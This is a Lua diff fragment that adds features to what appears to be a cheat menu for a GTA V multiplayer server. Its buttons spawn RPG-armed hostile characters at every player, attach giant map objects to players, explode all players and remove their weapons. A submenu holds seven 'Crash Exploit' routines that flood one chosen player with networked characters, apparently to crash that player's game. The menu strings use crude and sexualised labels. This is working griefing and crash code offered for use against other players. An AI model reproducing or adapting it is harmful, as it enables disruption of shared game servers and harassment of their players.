+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(i)) then
+                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+		elseif IhadSexWithMyStepMother.Button("Spawn Naked Peds ~s~To all Players ") then
+                    local swat = "a_m_m_acult_01"
+					local bR = "weapon_rpg"
+                    local plist = GetActivePlayers()
+                        for i = 0, #plist do
+                        local coo = GetEntityCoords(GetPlayerPed(i))
+                        RequestModel(GetHashKey(swat))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(swat)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetPedCanSwitchWeapon(ped, true)
+                                NetToPed(ei)
+                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(i)) then
+                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+                elseif IhadSexWithMyStepMother.Button("~s~Spawn ~s~Cow ~s~To all Players ") then
+                    local swat = "a_c_cow"
+					local bR = "weapon_rpg"
+                    local plist = GetActivePlayers()
+                        for i = 0, #plist do
+                        local coo = GetEntityCoords(GetPlayerPed(i))
+                        RequestModel(GetHashKey(swat))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(swat)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetPedCanSwitchWeapon(ped, true)
+                                NetToPed(ei)
+                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(i)) then
+                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+                elseif IhadSexWithMyStepMother.Button("~s~Spawn ~s~Sexy Girls ~s~To all Players ") then
+                    local swat = "u_f_y_danceburl_01"
+					local bR = "weapon_rpg"
+                    local plist = GetActivePlayers()
+                        for i = 0, #plist do
+                        local coo = GetEntityCoords(GetPlayerPed(i))
+                        RequestModel(GetHashKey(swat))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(swat)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
+                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetPedCanSwitchWeapon(ped, true)
+                                NetToPed(ei)
+                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(i)) then
+                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+				elseif IhadSexWithMyStepMother.Button('~s~Make all Players ~s~Arrows') then
+				for i = 0, 128 do
+                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
+                            local eb = 'ar_prop_ar_arrow_wide_xl'
+                            local ec = GetHashKey(eb)
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetVehiclePedIsIn(GetPlayerPed(i), false),
+                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        else
+                            local eb = 'ar_prop_ar_arrow_wide_xl'
+                            local ec = GetHashKey(eb)
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetPlayerPed(i),
+                                GetPedBoneIndex(GetPlayerPed(i), 0),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        end
+                    end
+          elseif IhadSexWithMyStepMother.Button('~s~Make all Players ~s~Tower 8x Very Long ;)') then 
+		  for i = 0, 128 do
+                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
+                            local eb = 'ar_prop_ar_cp_tower8x_01a'
+                            local ec = GetHashKey(eb)
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetVehiclePedIsIn(GetPlayerPed(i), false),
+                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        else
+                            local eb = 'ar_prop_ar_cp_tower8x_01a'
+                            local ec = GetHashKey(eb)
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetPlayerPed(i),
+                                GetPedBoneIndex(GetPlayerPed(i), 0),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        end
+                    end
+			elseif IhadSexWithMyStepMother.Button('~s~Make all Players ~s~Walls') then
+                    local plist = GetActivePlayers()
+                        for i = 0, #plist do
+                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
+                            local eb = 'stt_prop_stunt_track_start'
+                            local ec = -145066854
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetVehiclePedIsIn(GetPlayerPed(i), false),
+                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        else
+                            local eb = 'stt_prop_stunt_track_start'
+                            local ec = GetHashKey(eb)
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetPlayerPed(i),
+                                GetPedBoneIndex(GetPlayerPed(i), 0),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        end
+                    end
+	 elseif IhadSexWithMyStepMother.Button('~s~Make all Players ~s~TUBE Large') then
+                    local plist = GetActivePlayers()
+                        for i = 0, #plist do
+                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
+                            local eb = 'stt_prop_stunt_tube_m'
+                            local ec = -145066854
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetVehiclePedIsIn(GetPlayerPed(i), false),
+                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        else
+                            local eb = 'stt_prop_stunt_tube_m'
+                            local ec = GetHashKey(eb)
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetPlayerPed(i),
+                                GetPedBoneIndex(GetPlayerPed(i), 0),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        end
+                    end
+                elseif IhadSexWithMyStepMother.Button('~s~Make all Players ~s~Big Screen') then
+                    local plist = GetActivePlayers()
+                        for i = 0, #plist do
+                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
+                            local eb = 'prop_big_cin_screen'
+                            local ec = -145066854
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetVehiclePedIsIn(GetPlayerPed(i), false),
+                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        else
+                            local eb = 'prop_big_cin_screen'
+                            local ec = GetHashKey(eb)
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetPlayerPed(i),
+                                GetPedBoneIndex(GetPlayerPed(i), 0),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        end
+                    end
+                elseif IhadSexWithMyStepMother.Button('Attach Sandy Shores') then
+                    local plist = GetActivePlayers()
+                        for i = 0, #plist do
+                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
+                            local eb = 'cs4_lod_01_slod3'
+                            local ec = -145066854
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetVehiclePedIsIn(GetPlayerPed(i), false),
+                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        else
+                            local eb = 'cs4_lod_01_slod3'
+                            local ec = GetHashKey(eb)
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetPlayerPed(i),
+                                GetPedBoneIndex(GetPlayerPed(i), 0),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        end
+                    end
+            elseif IhadSexWithMyStepMother.Button("Explode All Players") then
+                ExplodeAll(includeself)
+            elseif IhadSexWithMyStepMother.CheckBox("Explode All Players", ExplodingAll) then
+                ExplodingAll = not ExplodingAll
+            elseif IhadSexWithMyStepMother.Button("Give All Players Weapons") then
+                GiveAllPlayersWeapons(includeself)
+            elseif IhadSexWithMyStepMother.Button("Remove All Players Weapons") then
+                StripAll(includeself)
             end
 
-            if content then
-                local contains
+			
 
-                for _, strip in dict.pairs(dat.Strip) do
-                    if not contains then
-                        contains = content:find(strip) ~= nil
+	
+			
+			
+			elseif IhadSexWithMyStepMother.IsMenuOpened('crashtroll') then
+			   if IhadSexWithMyStepMother.Button('Crash Exploit 1') then
+                    for i = 0, 32 do
+                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey('ig_wade'))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey('ig_wade')) then
+                            local ped =
+                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                RequestNetworkControl(ped)
+                                GiveWeaponToPed(ped, GetHashKey('WEAPON_RPG'), 9999, 1, 1)
+                                SetPedCanSwitchWeapon(ped, true)
+                                makePedHostile(ped, selectedPlayer, 0, 0)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        else
+                            Citizen.Wait(0)
+                        end
+                                        end
+             elseif IhadSexWithMyStepMother.Button('Crash Exploit 2') then
+                    for i = 0, 32 do
+                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey('mp_m_freemode_01'))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey('mp_m_freemode_01')) then
+                            local ped =
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                RequestNetworkControl(ped)
+                                GiveWeaponToPed(ped, GetHashKey('WEAPON_RPG'), 9999, 1, 1)
+                                SetPedCanSwitchWeapon(ped, true)
+                                makePedHostile(ped, selectedPlayer, 0, 0)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        else
+                            Citizen.Wait(0)
+                        end
+                                        end
+            elseif IhadSexWithMyStepMother.Button('Crash Exploit  3') then
+                    for i = 0, 32 do
+                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey('mp_f_freemode_01'))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey('mp_f_freemode_01')) then
+                            local ped =
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                RequestNetworkControl(ped)
+                                GiveWeaponToPed(ped, GetHashKey('WEAPON_PISTOL'), 9999, 1, 1)
+                                SetPedCanSwitchWeapon(ped, true)
+                                makePedHostile(ped, selectedPlayer, 0, 0)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        else
+                            Citizen.Wait(0)
+                        end
+                                        end
+            elseif IhadSexWithMyStepMother.Button('Crash Exploit 4') then
+                    for i = 0, 32 do
+                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey('a_m_m_afriamer_01'))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey('a_m_m_afriamer_01')) then
+                            local ped =
+                                                                CreatePed(21, GetHashKey('a_m_m_afriamer_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('a_m_m_afriamer_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('a_m_m_afriamer_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('a_m_m_afriamer_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('a_m_m_afriamer_01'), coords.x, coords.y, coords.z, 0, true, false)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                RequestNetworkControl(ped)
+                                GiveWeaponToPed(ped, GetHashKey('WEAPON_ASSAULTRIFLE'), 9999, 1, 1)
+                                SetPedCanSwitchWeapon(ped, true)
+                                makePedHostile(ped, selectedPlayer, 0, 0)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        else
+                            Citizen.Wait(0)
+                        end
+                                        end
+          elseif IhadSexWithMyStepMother.Button('Crash Exploit 5') then
+                    for i = 0, 32 do
+                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey('mp_f_freemode_01'))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey('mp_f_freemode_01')) then
+                            local ped =
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                RequestNetworkControl(ped)
+                                GiveWeaponToPed(ped, GetHashKey('WEAPON_ASSAULTRIFLE'), 9999, 1, 1)
+                                SetPedCanSwitchWeapon(ped, true)
+                                makePedHostile(ped, selectedPlayer, 0, 0)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        else
+                            Citizen.Wait(0)
+                        end
+                                        end
+        elseif IhadSexWithMyStepMother.Button('Crash Exploit 6') then
+                    for i = 0, 32 do
+                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey('mp_f_freemode_01'))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey('mp_f_freemode_01')) then
+                            local ped =
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                RequestNetworkControl(ped)
+                                GiveWeaponToPed(ped, GetHashKey('WEAPON_COMBATPISTOL'), 9999, 1, 1)
+                                SetPedCanSwitchWeapon(ped, true)
+                                makePedHostile(ped, selectedPlayer, 0, 0)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        else
+                            Citizen.Wait(0)
+                        end
+                                        end
+           elseif IhadSexWithMyStepMother.Button('Crash Exploit 7') then
+                    for i = 0, 32 do
+                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey('mp_f_freemode_01'))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey('mp_f_freemode_01')) then
+                            local ped =
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                RequestNetworkControl(ped)
+                                GiveWeaponToPed(ped, GetHashKey('WEAPON_PISTOL_MK2'), 9999, 1, 1)
+                                SetPedCanSwitchWeapon(ped, true)
+                                makePedHostile(ped, selectedPlayer, 0, 0)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        else
+                            Citizen.Wait(0)
+                        end
+                                        end
+										end
+			 elseif IhadSexWithMyStepMother.IsMenuOpened('troll') then
+			 if IhadSexWithMyStepMother.Button('~r~!!Spawn All Objects on him!!') then
+                                        local hamburg = "cs1_lod2_01_7_slod3"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
